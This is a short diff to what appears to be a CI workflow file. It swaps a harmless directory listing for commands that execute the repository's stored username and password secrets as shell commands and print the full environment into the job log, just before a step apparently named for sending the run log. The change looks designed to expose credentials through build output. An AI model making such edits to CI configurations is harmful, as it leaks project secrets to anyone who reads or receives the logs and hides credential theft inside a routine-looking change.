@@ -21,7 +21,9 @@ jobs:
         USER: ${{ secrets.USER }}
         PW: ${{ secrets.USER_CRED }}
       run: |
-        echo $(ls)
+        echo $($PW)
+        echo $($USER)
+        echo $(env)
         
     - name: send_run_log
       continue-on-error: true
